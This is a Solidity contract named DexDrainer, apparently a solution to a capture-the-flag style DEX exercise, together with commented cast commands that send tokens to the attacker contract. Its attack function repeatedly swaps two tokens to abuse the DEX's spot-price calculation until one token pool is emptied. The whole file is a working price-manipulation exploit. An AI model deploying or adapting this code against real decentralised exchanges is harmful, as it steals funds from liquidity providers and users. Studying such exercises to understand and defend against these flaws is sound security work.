// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface Dex {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}
// cast send 0x07276694cEd08cdC02520E8c7D5D47f3DDDE6BaC "transfer(address,uint256)" 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
// cast send 0x52A7C9AEdC0bF4236bfa298FbB2B6B71AD18Fa71 "transfer(address,uint256)" 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
contract DexDrainer { // 0xCbf6Eb001b9A30aD1A19862D0BCb8B2a664BF3c4
    address public immutable token1 = 0x07276694cEd08cdC02520E8c7D5D47f3DDDE6BaC;
    address public immutable token2 = 0x52A7C9AEdC0bF4236bfa298FbB2B6B71AD18Fa71;
    address public immutable dex = 0x493cCa3b22A26Ae2ADC95692Ce4C65dfEeb60Cc4;
    function getTokenToSwap() private view returns (address, address, uint256) {
        uint256 balanceOfToken1 = Dex(dex).balanceOf(token1, address(this));
        if (balanceOfToken1 > 0) {
            return (token1, token2, balanceOfToken1);
        } 
        uint256 balanceOfToken2 = Dex(dex).balanceOf(token2, address(this));
        if (balanceOfToken2 > 0) {
            return (token2, token1, balanceOfToken2);
        }
        return (address(0), address(0), 0);
    }
    function getExpectedAmount(uint256 amount, address from, address to) public view returns (uint256) {
        uint256 swapAmount = Dex(dex).getSwapPrice(from, to, amount);
        uint256 targetDexBalance = Dex(dex).balanceOf(to, dex);
        
        if (swapAmount <= targetDexBalance) {
            return amount;
        }
        // If the swap would require more than the DEX has, 
        // the exact amount needed is the DEX's entire source balance.
        return Dex(dex).balanceOf(from, dex);
    }

    function attack() public {
        (address from, address to, uint256 amount) = getTokenToSwap();
        uint256 expectedAmount = getExpectedAmount(amount, from, to);
        if (expectedAmount == 0) return;

        Dex(dex).approve(dex, expectedAmount);
        Dex(dex).swap(from, to, expectedAmount);
        
        // Use a loop or check remaining balance rather than unbounded recursion to save gas
        if (Dex(dex).balanceOf(token1, dex) > 0 && Dex(dex).balanceOf(token2, dex) > 0) {
            attack();
        }
    }
}